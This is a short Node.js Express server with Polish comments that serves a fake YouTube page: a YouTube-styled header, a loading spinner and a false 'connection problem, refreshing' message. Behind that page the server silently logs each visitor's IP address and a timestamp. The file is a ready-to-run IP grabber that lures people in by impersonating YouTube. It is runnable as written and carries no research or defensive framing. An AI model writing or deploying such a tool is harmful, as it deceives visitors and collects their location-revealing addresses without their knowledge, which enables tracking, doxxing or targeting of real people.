const express = require('express');
const app = express();

app.set('trust proxy', true);

app.get('/', (req, res) => {
    // Rejestracja IP w tle
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    console.log(`[IP ZAREJESTROWANE] ${new Date().toISOString()} - IP: ${clientIp}`);

    // Zwrócenie strony stylizowanej na YouTube
    res.send(`
        <!DOCTYPE html>
        <html lang="pl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>YouTube</title>
            <style>
                body {
                    margin: 0;
                    padding: 0;
                    background-color: #0f0f0f;
                    color: #f1f1f1;
                    font-family: "Roboto", "Arial", sans-serif;
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    justify-content: center;
                    height: 100vh;
                }
                .header {
                    position: absolute;
                    top: 0;
                    left: 0;
                    width: 100%;
                    padding: 12px 24px;
                    display: flex;
                    align-items: center;
                    box-sizing: border-box;
                }
                .logo {
                    display: flex;
                    align-items: center;
                    font-weight: bold;
                    font-size: 18px;
                    letter-spacing: -0.5px;
                }
                .play-icon {
                    background-color: #ff0000;
                    color: white;
                    padding: 4px 8px;
                    border-radius: 4px;
                    margin-right: 6px;
                    font-size: 12px;
                }
                .player-box {
                    width: 80%;
                    max-width: 854px;
                    aspect-ratio: 16 / 9;
                    background-color: #000000;
                    border-radius: 12px;
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    justify-content: center;
                    box-shadow: 0 4px 20px rgba(0,0,0,0.5);
                    position: relative;
                }
                .error-msg {
                    color: #aaaaaa;
                    font-size: 14px;
                    margin-top: 12px;
                }
                .spinner {
                    width: 48px;
                    height: 48px;
                    border: 5px solid #333;
                    border-top: 5px solid #ff0000;
                    border-radius: 50%;
                    animation: spin 1s linear infinite;
                }
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
            </style>
        </head>
        <body>
            <div class="header">
                <div class="logo">
                    <span class="play-icon">▶</span> YouTube
                </div>
            </div>
            
            <div class="player-box">
                <div class="spinner"></div>
                <div class="error-msg">Wystąpił problem z połączeniem. Trwa odświeżanie...</div>
            </div>
        </body>
        </html>
    `);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Serwer działa'));
